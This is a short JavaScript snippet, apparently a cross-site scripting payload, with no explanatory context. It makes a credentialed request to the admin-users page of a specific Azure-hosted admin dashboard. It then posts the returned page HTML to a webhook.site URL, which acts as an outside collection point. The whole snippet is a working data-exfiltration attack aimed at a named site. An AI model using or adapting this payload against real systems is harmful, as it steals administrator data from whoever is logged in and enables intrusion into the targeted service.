var xhr = new XMLHttpRequest();

xhr.open('GET', 'https://haatadmindashboard.azurewebsites.net/admin/admin-users', true);

xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {

        var http = new XMLHttpRequest();
        var url = "https://webhook.site/c9acf359-3377-4d49-865e-0d4ec7f409c0";
        http.open("POST", url, true);
        http.setRequestHeader("Content-type", "text/plain");
        http.onreadystatechange = function() {
            if (http.readyState == 4 && http.status == 200) {

            }
        };
        
           page_data = {
                    "page_html": xhr.responseText.substring(0,8900000),
                    "uri": 'https://haatadmindashboard.azurewebsites.net/admin/get_admins'
                };
        http.send(JSON.stringify(page_data));



  }
};
xhr.send(null);
